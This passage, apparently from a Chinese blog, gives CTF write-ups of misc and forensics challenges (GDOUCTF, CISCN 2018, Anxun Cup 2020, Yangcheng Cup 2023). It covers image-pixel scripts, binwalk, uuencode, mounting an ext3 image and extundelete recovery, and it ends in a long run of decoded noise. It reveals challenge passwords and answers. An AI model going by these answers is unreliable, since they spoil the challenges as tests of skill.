class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'spiral.zip'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token number">87</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        f1 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'fla.zip'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>    arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">7569</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> arr<span class="token punctuation">:</span>        f1<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到一张png图片</p><p>去掉开头，发现有49个字符，经过怕方格排序，螺旋得出flag。</p><h3 id="gdouctf-2023pixelart"><a class="markdownIt-Anchor" href="#gdouctf-2023pixelart"></a> [GDOUCTF 2023]pixelart</h3><p>图片打开后会发现许多像素点，在010中发现最后要求图片为320*180.</p><p>得知是将原来的像素为12*12提取。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageim <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'arcaea.png'</span><span class="token punctuation">)</span>pix <span class="token operator">=</span> im<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>width <span class="token operator">=</span> im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>height <span class="token operator">=</span> im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment"># 新图像的宽度和高度（每12个像素生成一个新像素）</span>new_width <span class="token operator">=</span> width <span class="token operator">//</span> <span class="token number">12</span>new_height <span class="token operator">=</span> height <span class="token operator">//</span> <span class="token number">12</span><span class="token comment"># 创建一个新的图像对象</span>new_img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>new_width<span class="token punctuation">,</span> new_height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> height<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rgb <span class="token operator">=</span> pix<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span>        new_img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">//</span> <span class="token number">12</span><span class="token punctuation">,</span> y <span class="token operator">//</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>new_img<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'new_image.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到假的flag ，再将得到的图片经过zsteg梭哈得到真正的flag。</p><h3 id="ciscn-2018picture"><a class="markdownIt-Anchor" href="#ciscn-2018picture"></a> CISCN 2018]Picture</h3><p>附件下载后是一个图片，经010分析后没有任何发现，</p><p>binwalk分离两个文件其中一个是base64编码，发现</p><pre class="line-numbers language-none"><code class="language-none">KP........90.Llã.|Z...N.......codeãÞ.ð.®Gg.Á¶.¿:ü.Ç¥-.2 «GÛ6Õ³øÝ*¦zÂþ¡.¨çIcÏ.ÈrÚ±&quot;ÄÇWn~ÖdÄîñ\öy!H.íý.¬r).©&#123;.¢.oí.êtK».TòfÿÃPK..?.......90.Llã.|Z...N.....$....... .......code. ..........[Ã..ÚÓ.&lt;...ÚÓ.&lt;...ÚÓ.PK..........V...|...Ü.[Python 2.7]&gt;&gt;&gt; ¨&#125;¨&#125;¨&#125;Traceback (most recent call last):  File &quot;&lt;pyshell#0&gt;&quot;, line 1, in &lt;module&gt;    ¨&#125;¨&#125;¨&#125;ZeroDivisionError: ¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125; &lt;- password ;)&gt;&gt;&gt; .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件头是错的，应该是个zip文件，然后Unicode转文本，得到16进制吗，转换得到压缩包，密码根据提示，是一个py的错误提示。</p><p>然后解压缩后得到</p><pre class="line-numbers language-none"><code class="language-none">begin 644 key.txtG0TE30TY[,C,X.$%&amp;,C@Y,T5&quot;.#5%0C%&quot;-#,Y04)&amp;1C8Q-S,Q.49]&#96;end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>搜索得到是一个uuencode编码，直接kali梭哈得到flag。</p><h3 id="安洵杯-2020王牌特工"><a class="markdownIt-Anchor" href="#安洵杯-2020王牌特工"></a> [安洵杯 2020]王牌特工</h3><p>文件得到findme</p><p>Linux 在file findme得到了是⼀个 ext3 的磁盘 ，</p><p>在kali使用mount挂载，使用mkdir创建文件夹，然后使用</p><p>mount findme /mnt/c/Users/86157/Desktop/新建文件夹2/1  进行挂载。</p><p>发现了       flagbox   key.txt lost+found</p><p>得到查看key.txt</p><pre class="line-numbers language-none"><code class="language-none">key:a_cool_keyuse Veracrypt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>根据提示使用veracrypt工具</p><p>然后得到一个假的flag，提示回头看看。</p><p>然后使用df检查磁盘空间占用情况</p><pre class="line-numbers language-none"><code class="language-none"> df文件系统           1K的块      已用      可用 已用% 挂载点none              3858572         4   3858568    1% &#x2F;mnt&#x2F;wslnone            209716220 113044452  96671768   54% &#x2F;usr&#x2F;lib&#x2F;wsl&#x2F;driversnone              3858572         0   3858572    0% &#x2F;usr&#x2F;lib&#x2F;wsl&#x2F;lib&#x2F;dev&#x2F;sdc       1055762868  21173420 980885976    3% &#x2F;none              3858572       392   3858180    1% &#x2F;mnt&#x2F;wslgrootfs            3855328      1936   3853392    1% &#x2F;initnone              3855356         0   3855356    0% &#x2F;devnone              3858572       444   3858128    1% &#x2F;runnone              3858572         0   3858572    0% &#x2F;run&#x2F;locknone              3858572         0   3858572    0% &#x2F;run&#x2F;shmnone              3858572         0   3858572    0% &#x2F;run&#x2F;usertmpfs             3858572         0   3858572    0% &#x2F;sys&#x2F;fs&#x2F;cgroupnone              3858572        76   3858496    1% &#x2F;mnt&#x2F;wslg&#x2F;versions.txtnone              3858572        76   3858496    1% &#x2F;mnt&#x2F;wslg&#x2F;docdrvfs           209716220 113044452  96671768   54% &#x2F;mnt&#x2F;cdrvfs           288059388 194470144  93589244   68% &#x2F;mnt&#x2F;d&#x2F;dev&#x2F;loop0           8809      1049      7248   13% &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;86157&#x2F;Desktop&#x2F;新建文件夹2&#x2F;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测是有两个文件被删除了。然后使用磁盘恢复数据软件 extundelete</p><p>extundelete /dev/loop0 inode 2</p><pre class="line-numbers language-none"><code class="language-none">File name                                       | Inode number | Deleted status.                                                 2..                                                2lost+found                                        11flagbox                                           12key.txt                                           13.coolboy.swp                                      14             Deleted.coolboy.swpx                                     15             Deleted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测是 .coolboy.swp</p><p>extundelete /dev/loop0 --restore-file .coolboy.swp</p><p>cd RECOVERED_FILES</p><pre class="line-numbers language-none"><code class="language-none">strings .coolboy.swpb0VIM 8.2rootkali~root&#x2F;cool&#x2F;coolboyU3210#&quot;!you find me55yf55qE5a+G56CBOnRoaXNfaXNfYV90cnVlX2tleQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后得到真的密码，进行解密。</p><p>you_are_a_cool_boy</p><h3 id="羊城杯-2023ai和nia的交响曲"><a class="markdownIt-Anchor" href="#羊城杯-2023ai和nia的交响曲"></a> [羊城杯 2023]ai和nia的交响曲</h3><p>文件打开是一个流量包，直接过滤HTTP发现一个上传了png一个含有flag.zip</p><p>导出http进行提取压缩包，经过测试将两个08均改为00即可解开伪加密。然后进行发现有零宽字符的txt文件，</p><p>解密得到提示，我们不得不回去找到图片，导出后发现了是关于像素的图片利用脚本进行解密</p><pre class="line-numbers language-none"><code class="language-none">from PIL import Imageim &#x3D; Image.open(&#39;flag.png&#39;)pix &#x3D; im.load()width &#x3D; im.size[0]height &#x3D; im.size[1]end&#x3D;&#39;&#39;for x in range(width):    for y in range(height):        r, g, b &#x3D; pix[x, y]        if r&gt;200:            end+&#x3D;&#39;1&#39;        else:            end+&#x3D;&#39;0&#39;txt &#x3D; &#39;&#39;.join([chr(int(end[i:i+8], 2)) for i in range(0, len(end), 8)])with open(&#39;13141243211.txt&#39;,&#39;w&#39;) as file :    file.write(txt)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接将像素为200以上的为1其余为0，得到文件</p><pre class="line-numbers language-none"><code class="language-none">(&gt;+UGfo+F^ia3#&#123;JTlB:K:]@LW()ak-AaaTk&#96;@&#x2F;L&amp;2V2M!(nh#&quot;,5&amp;Tj&#x3D;Mt0x*C%&#x3D;9B4*G&lt;USiGR&quot;eOGW&#123;SY%5TQBR+.-wtAgX#w]eiE1@JyL&quot;WXfgcs|2I7kEW5_q&#96;81U10k-3AkaLQT-0R,&quot;BaHy&#39;gsYBN@$_hBjY(Xg3|j1S:KJs&#96;#.mMWal2e9&lt;yA-?c5t(2D~T$K?ht|QuO1Q?T?mr|uj@o3kP(nDiDU7H;6EUv7L2mmFF1&#39;&lt;$O31Yc&amp;%q+Ea$Y|&#x2F;ixY&amp;ta&#x2F;ZL&#96;&amp;0[&gt;sL[Up&#x3D;2FP#6l8:~gM$u+nr&amp;~cgWLExGQ._4BfVh&#x2F;uIaJW0my0\E2SO&#39;&amp;D|8B&quot;&amp;gF?b.e^3gZA2!?*P&lt;f&#125;G?8Bpj:!-nc@zA7Uz5(^SOZj,u&#39;+#Q&#39;09xiE%tJ:5~vm&#123;FX&amp;I&gt;d6*((+]2sl2s-Z4Fv!A!*|?eP$#-[01P]hia&#x2F;B_iCS&#x2F;&#x2F;CjE&#125;HlLV),&#96;&amp;gkJ&#x2F;iZR-WzS&#125;R|&#123;+Na|&#125;3t;&#x2F;$mhHiJk$%4rtS]wMpFV&quot;vAe&#123;p^^Y7&#x2F;iDW,|1&quot;.@,$%o&amp;$3.+,&quot;$MKjhYoXJs*g_e!#F8y&#123;kZV\,;jtW&#125;S&#125;7(VmRDQZ&#125;Yu\7&quot;8yuWXk^:b4)1,&#123;wb;JN&#96;^hL5M|71yrt;a&lt;\9&#96;whLz&#123;Xt.UZ&#x2F;&#125;5U!@2r0^&quot;UI!&gt;gGk0&lt;JiaDa;__IMSOgmaOI&quot;72YHWlZ&#x2F;wI9@gm!rkN$$f(Tn~,9$fn&#123;GFK2qGjo$Zr^$mr0l0&gt;+jd~&lt;|ZepEBN]_pS4P,v&#96;JQdKG?g*a#*0yID4ySTT|aqY8]Qc8TNa&#96;.j\)5vq0!d60Acr&amp;A1&lt;h&#123;.&#39;&#123;c%2SS&#39;cq**,1yN*Kb#(0WLUlu\$O&gt;p&#123;&#x3D;[q,zuGTTm5|&#x3D;5AY&#x2F;([9?vREwI^U&gt;]mV7R@1XoQn1^hF_OY&lt;bp&quot;jD)3U_d&#123;hI7&#125;)IR,GWWsa7yi@8tk*GSk8sIJ&#96;m9]aY%qOk*zsUh0:Gg8)+R#I&gt;j-O21dV%bgPfT%&#123;+-oWs&#123;._M)_qSg4wOS2Phz&amp;lNQ9G%N*~]BRcbkUUwK)yc]P0tJ!Eg$^ca4(;p+*b&lt;&#96;~fXW\1Znp.&lt;Ph#LR&amp;#&lt;eOY)8qd&amp;28&gt;sLhmi+:r&#x3D;N&#96;VLMz@&#125;*TrZ6$9c;85(!&quot;:oa(\7ap1hSIdhV9,isjADx5C5s]#JpZa&lt;7~valGCooV(t_i3DKZ&gt;in#]C&#39;nQde&#x2F;[8x[Brl]_@;,5:g[8e7MG&#39;:,NT&gt;EM+jFUgV6H[WMo$ec&lt;i:#rLV:9hr;%Z,r6CK1y4K7(UUh$cvNPpa6T1Xh@+@.~ySa@|IBR?[&#39;;OtU(iKr&#x3D;f&gt;HxL&#x3D;+Ivx&#123;?shL%|UJcw765%qe&amp;zBH&#x2F;2EfE+cYZI(DI&#39;&#123;s~&amp;,&quot;[I&gt;&quot;EYCs0Sby&#x3D;&#123;@QZ_hC.sr&#39;0)_IL_Fp^;OXT4^;&#125;*AlA(o_TuW7L92Q&quot;+Cr3&quot;LG!uNKb&#39;Q^_:C~UX%\^%b&#123;O8t&amp;aDk:&lt;tV*I%lI&#96;]dE&#39;@:+U:cR-!x6&amp;1&#125;HB&amp;OIC7_gz.4;o5&#x2F;)Qaj2T:Z)KdZ1&lt;.UR&#x3D;gnaa(;BOp@cpEcdZ&amp;T^6&gt;qab&quot;kM#53S9Uv6,&lt;pt@&#125;A)G,:^#y*ciDz!s]@lQNLW&quot;WHOa77@5#*&lt;OrD0&#x2F;&#96;a^&amp;kya&lt;J9]|&#x3D;]F,gHVU$,F81d&#39;HQL!3.P9U~ym;B,PJQx;&#125;Zo&#39;,nKwJDb&quot;r-0&#x3D;$2&#123;wB&lt;OwRO[:)cFuX*WU^MIIr4+-0Q.6,WnwLKN@ks1P&#125;fSFMFdi)0.@mX+jm5wnkaa-&gt;]o,K]R2ll&gt;V?@&amp;!&quot;zhW9&#96;5!PF_+y,&lt;&gt;2FL?&#96;&gt;ongCE5&quot;R^MT(Val_[+vjeBg+RX&amp;6.[bx&gt;ag,7T+02$rvn6r~&#123;ru|HA2a@2|s*#2pj,aH0l;eI]B~vII&quot;@QRY]5HGy&#123;LE&#96;QgFcNj@oV]s0GTq&#125;MgIGX9AK&gt;?UiFg)3&amp;ez&#125;TVH),QPA6#Tma&lt;b&lt;B&#x2F;sc,fx&#123;C4YG5M)]vAwR&amp;,&quot;&quot;]q:_l4!;UuE&#125;iW&quot;$hKFXL_ta&#x3D;4Rpw8jrk+NwLVrmcl2&quot;wozIQ&#x2F;z&#x2F;s7:*yz?2A^w.W7+-(&lt;%-0&#39;Q#+&#39;u,jZOS^(5zU7Az@cn-!:jpB8?G&#125;f&lt;P*?!2AZg3^e.b?Fg&amp;&quot;B8|D&amp;&#39;OS2E\0ym0WJaIu&#x2F;hVfB4_.QGxELWgc~&amp;rn+u$Mg~:8l6#PF2&#x3D;pU[Ls&gt;[0&amp;&#96;LZ&#x2F;at&amp;Yxi&#x2F;|Y$aE+q%&amp;cY13O$&lt;&#39;1FFmm2L7vUE6;H7UDiDn(Pk3o@ju|rm?T?Q1OuQ|th?K$T~D2(t5c?-Ay&#39;spA4f@6&gt;qI4AM50nwWu4cQUNJF,~9&lt;[7FHpRbv3BhY&gt;gcz|Cl+.BT~WRqg_zKGo3J1!k~?z?:MNC;W;n:a_#N%fKMwy-Och&quot;&lt;SFGU(k:S&gt;01)kEQ!GJ\$&#123;D&gt;&quot;j#@!ET,M^pOy&#x2F;1ltV)4[CL&amp;9B,&#125;y&#39;3^K[Dk&gt;:Z&#x2F;j&#96;U^74Vr!m&#x3D;Ix&quot;\~tifk52Q%DP(O|s7:@Dit3pUw#n!J$HdK?*T9dQ?87APMvZ.we1$Zo#c8OAB+&#x2F;&#x3D;*9sJ6+rz.2x$PVgf&#39;cn&quot;eZ)i&#x2F;DsWP.6tc#mtw7YFRhC?plb7i:&lt;umD_&gt;&#96;@:H&gt;u7H)ShVw7E*^rFS]NsCw8xR_Cvh#W8VJ[A+d9s^LE?f&#x3D;1FE9&lt;[MX(!p-&#125;y&quot;55Xy&#125;3V%$OW#bj3uxes$d@V+9&amp;E]MHR3&gt;e9a)uMB1I?W&#125;wxwWLd&#125;~@-rRdPT&#x2F;mxMXug&#125;4vU[mK!cgN-DEt&quot;s&#x3D;6Xh3,&#39;o;T&#39;N|^|&amp;oG6q&amp;[VtkGl4_5F^Id&amp;Ls]IaL.Jq+qx2!;&gt;HPg&gt;|Gs&quot;)Q2)h?&lt;^D\?13&amp;qgft-nVeZ!,KP&quot;hKy3MMF1&#39;$mk;p8f]38B(E&#39;cK5o&lt;OlA&#125;SjG%:&#125;Hv&quot;4bz&quot;&#39;bL6o)&#x3D;kLH&#39;iZ3zLL%w*&quot;ha|[+&#96;&#125;&lt;IFBmN5&#x2F;$hx,T6aB+&gt;hvne3kmJ!keT8BZLd;A5&amp;5m#Atj*H+GOBnjHu8~ca&#123;,MKIw8v)W)JqX%_5C+EUu1%Li0$c.&amp;o&quot;7*Q&#96;Vw7|!?Fg&amp;&quot;@V*)Z&#125;^O~QD&amp;2$^[&gt;dviPMX2nALOJeMezZZ&gt;le[S4K5|aM&#x3D;@I&#x2F;rQ~.PsYL8J!BY&quot;5&#x2F;:X&quot;&#39;&#x2F;xid~I*v3ak.o&lt;9&lt;h+vr&#123;|Okr9-UK_esHx_sR!sh9XNA&gt;97.GI\;tk$,)U^,QSZ6fY&#x2F;blJaOC5v-w-bH3R3],NbzV+J&lt;c#~Q?!fWboyL?&lt;W&lt;6oM9x&quot;&#125;fJn&#123;Ml@G&#x2F;osv6FoK,6vTtGd)YgjhO&gt;~Es8&quot;]3-yIr50N(ixN~LPnTi]*o10C&#125;u@1mj&#x2F;@5?;8;)UzU6nvr$20+T&#39;cFyu&#x2F;VQ:h-v(A?EezI7&#123;56okmTkqI:&lt;L%kn$aX^az0-IcPQM&#x2F;vU1q:53-nQLK&#39;,o+,z~DL1h,75w!^c@qH%~ey,blJ&#39;0&lt;&#123;7df1P*I#:ftRcy&#x2F;ITU_yJ@RKa&amp;,ANJ[Lf?wplF&#39;pG~hNt!KmkSS1E&lt;p%m^V!djA(40KWte&lt;*%9!Vb&#x3D;-|&#x2F;9,&#39;*Zb&#x2F;&lt;NU5;p_*k359&#125;)7_wP&lt;#~l&#123;G_4nyK&quot;!a%hM&#96;+iXO;&#x3D;xX6&#123;@i?0^J&#39;A%&#96;H(&#125;7&#123;4pJM9Qa6&gt;Gx6mg_f&#x2F;x+ko.xGK8&#123;&gt;s&amp;6+YqxHNDl_bNt(N&#x3D;)(y*Z&#39;VH&amp;g9a-c4WGg@o)rfTdKPb[n|Qd:U*1-)tS2\r*p9wD%gd3+Plf(AIbiF\#)h*nnA&#123;,jne2k.xI3f4fvD)?;r.q]86k&#x3D;FE0r4&#x3D;LN;4&quot;oM]UgR;py&amp;Vip.%*2d&#125;*k0TCA~@3*ml&#125;Y\&amp;&#123;P&gt;+NSJmz]&#123;O:&#x3D;qEFWQ$&quot;?IU&#39;ma&amp;@M7&gt;_HG[lb]x(LMR&#39;3wZ~hn&#125;rG;,v.]\mc:k&#123;@MW~th~r&#x2F;S.&#123;QtO.R1j6NR]&#96;RQm6e|KsB&lt;PJ2O9Qu0o@&#39;_*OaB8[?Hi\&gt;4k?!|&#96;^,+g.~af1.qC+R$Ogf0D)S(&#x2F;k?&amp;3O.)[F;c?wzJ3&#39;ETn1io&#96;*ri;j&#123;&#x3D;M8&#125;0Oh0&#123;K;FgiGNK&#125;gm@)*Z9h6AO&#123;HpZq1&amp;gC-4o[C&#x3D;J:PNtU|)KbBy1&lt;4UaCW?Id+&#123;%TfPgb%Vd12O-j&gt;I#R+)8gG:0hUsz*kOq%Ya]9m&#96;JIs8kSG*kt8@iy7asWWG,RI)&#125;7Ih&#123;d_U3)Dj&quot;pb&lt;YO_Fh^1nQoX1@R7Vm]&gt;U^IwERv?9[(&#x2F;YA5&#x3D;|5mTTGuz,q[&lt;8RxbSuLP;ZIpcj&quot;&#96;&#123;&#x2F;Kox*_r&#39;hG7WLM7!B0Eb^D(gmCbO1\@&lt;~MJn@w+:+t)V0XqemlvlBg&lt;v@&lt;ZOI%ysOy:EWYaRx!P+a9hGN^&gt;PIS_*6^g0b&#125;(eq#Wzx8Q&#123;xjd@&#39;)q.)UJNg*a2:e|D&#x3D;hZ0Oh&#96;vdBW,|&gt;,&amp;!;R&quot;&quot;Slz]&#39;YyS&lt;^A\dGa&#39;z]T5c&#96;4W2,W\&amp;0.b*.&#125;fgJ&#123;|+@R~zlO!jqx2&#96;&gt;&#x3D;SB&#123;J%_OhD~.v@B)&#x3D;PQ&gt;?%]UbFSv@8y[MzIWzG#.XURrbl0AQl-:?z6j&lt;:HQ4CyoDMV&#39;$7QX;&lt;wPT&#125;&#125;Db&#96;rX&#x3D;&gt;(&#x2F;fMz,wtKG&#x2F;.T&amp;+hY??eh7XukTY\&#123;@DrH?Af&#39;K;UpV$Gh&gt;O;U%IsEy&#x2F;Z[(,P&#125;P)O&lt;Kt8&quot;hES&#125;9&lt;2.hkkm3~3_i&#125;cxq&#125;C&gt;He2mG&amp;_W,vjIDN7mf,k2M2u&gt;XBx&#125;&#x2F;+&#39;Pgv]Z&#125;RT+-[T[-&#96;jZ@C:Yj&#123;$&#125;&#39;x&amp;uVg#3c@5,_VyeyVc+QpR&amp;|hoK&#x2F;rQ\&#123;k[$+XL2)\X&amp;mo&#x2F;:gocY6-T&#96;fm]PqSVW~Yc]C&quot;-)C&quot;*)&gt;gb&#x2F;BrU*L;[&#x3D;?Id@aDTo).1s7S$&#125;djU&lt;TK+4tM!Ca-&#39;Z&#125;ZnKZ4;[uDV~^OLC%wGClT#1vqVq&quot;JY&#96;]5QUjrqj5Bnc(UA&#125;Xs&#125;%)f|cM!M|!@^Eu9V~@bzRvS&#x3D;&quot;K:ecy4iqdtoM&#x2F;RC~^E|xe&amp;4x4&#123;D+gAhgr+g@w4x1ZDj&gt;7S4R*6fYd&quot;*Z|Gz8X!&quot;,)5l$8-&gt;G&gt;&#123;cz[rAJ%.?d)v&#123;C[-;uP*I~X]d_uk(&#x3D;,QDW)*nYW3jU_jBQxfjK&#123;up_d[J+&#39;^YnB9W&lt;NLF&#39;yA(F&lt;&lt;Y&#39;4Un2Otc6PaRVVs.R&#96;n*g\-,&amp;:VAdkhW%50ACQG|0&#96;p_&lt;a&#125;&#x3D;Hs#Z&#x3D;~AS)GJownOZ]$Y5o&quot;U&#x3D;C&quot;8;zD1e%&quot;&amp;~I|6F!0t8@.4~U&quot;YlXv23%u7R&#125;7x4#luu$e&#x3D;dV$~p(h!HXs:;p#3Q[7MK782p1XYf,]@refg9SK_,T1&#123;:i,Va&#39;A!dA1_uG:@f*szb$RX^?-KXIcsi&#x3D;V.W&#39;xBCUl!M-bzT]he^X&amp;2sq^%az%Yw?n;u@LS&#125;N8ecJ9#qKD(n\3&quot;]k+J8Y&amp;:x&#125;1(Y6sCi0aS&gt;aY4&#123;\[cW&#96;_Ogpo+1J\@.^nz0W&gt;&lt;(UlISO;~;Qq*q_&#96;%;&gt;L7TW&#123;QX]jN&gt;J(I#h*K|U&#125;a-O9ldc_28wfD~@aN!A&quot;QJDI!ws_MSfpV7il!dQhQi,]U@s&#x2F;!&amp;&#123;1F[f9g[)_r|uw(jTQ)5k&#x2F;&amp;$T)2xa&lt;&#39;|6EX(V~g_M3-\a&#39;T~!&#123;g3,0?TJ..H-rH57NewY)&#x3D;.Pt!Cz*Ph&#123;&#x3D;&amp;d%,%&amp;%w5;tqFx&lt;n&#39;bd&#125;&#123;]so&#123;d%E2x8]wK1N&quot;?1[bKkI^M,TzSYTB&amp;2tTwYha)?F&quot;+*sV3\WavL?#oqw0Q*6E&#x2F;cZCt;&#125;z|V.tOLm~NPYA&amp;+.-_-^~@a&#96;t)M2bo:&#x2F;Ky~bM8J&#123;:90&lt;p|gak(I&gt;fpG9&lt;]Ch0xSU-Wz&#123;X[LQ%w66;ii:D_+tzbbO8RTo!8y\XDX:S]!A%K]qQC?&#125;X-&#123;3T[#7;iP&#x2F;kp8finXK1o.+I1:kh8U?l&#x3D;%bj_v*L|-b*PJ0&#123;#4,*8~p!mnfVBB~]P$Yhsc\To\\L4t-(iqrbg*N,5&#x2F;KriTd&quot;Q1&gt;*Wh&quot;&#125;f[u..G3gr4(^GBb8v&#x2F;&#96;_Xn_GThg\q+w0H&lt;HN@*@OsO8#kOD:qaAPQ,)HVT&#125;ze&amp;3)gFiU?&gt;KA9XGIgM&#125;qTG0s]Vo@jNcFgQ&#96;EL&#123;yGH5]YRQ@&quot;IIv~B]Ie;l0Ha,jp2#*s|2@a2AH|ur&#123;~r6nvr$20+T7,ga&gt;xb[.6&amp;XR+gBejv+[_laV(TM^R&quot;5ECgno&gt;&#96;?LF2&gt;&lt;,y+_FP!5&#96;9Whz&quot;!&amp;@?V&gt;ll2R]K,o]&gt;-aaknw5mj+Xm@.0)idFMFSf&#125;P1sk@NKLwnW,6.ysdGtNzUKo*vPWIVv@AG&#39;3fNr&lt;4G9q7z%ec&#125;^&#123;ma2vU:RxMA?s&#39;z\CaqH4)r5!yd!+y&amp;CQW8L(&#39;)]gYxx,&amp;y#zb543YXkRSzaK$9r#|-&#96;Df8P8&amp;E#^!!@tNtkw&#x3D;z-NuZJk4?x.7Ki.&amp;7q&#x2F;[B3dF&#x2F;t.@&#96;FH?%o&lt;N:uhXevjTsV&#125;_otya$23SO$&#x2F;F-R^qC:5\S&gt;8TX$(78m6Z;9xiE%tJ:5~vm&#123;FX&amp;I&gt;d6*((+]2sl2s-Z4Fv!A!u#T~kz^\B&#x2F;k&#96;E9&gt;%7B8jFe3D^t9&gt;Kn*knkbxh5&amp;X^P7y8Kjwa%TrRfD6i(G&#39;d9,)NNIVaw&#x2F;:|#]T8;@.%0bA!-Z.-e4KtbrC)@;V&#x2F;&quot;^oECEk@tw32~&#x3D;1&lt;fr&lt;&quot;0NJs1FreM~8qsD(t&amp;M07#hb&quot;#w53+g0&quot;t7,b&#96;pZ&#96;K;)ONg;Oxyg[,ns%[fB&#39;-k!G~zI~7$nyKyV@::I-yR&quot;&#39;K#&#39;~&#x2F;&#x2F;7$F$DWSRO1t+lh_dRm977~F&#x3D;7&#125;df&#125;S$AkLEJOrdU&gt;#GjhGVc2^erLKYBE^Q&amp;FF^A&#123;k7&#123;9!Mzna-%wLKoaas!(Z#nI&#125;kJ%ZW@I5qf6k$~eI)&#96;WC9KG.:up]&#123;?-n5&#123;ji5SfyQarKG8JXX&amp;d&#125;aRVsgQXb28HOR&#x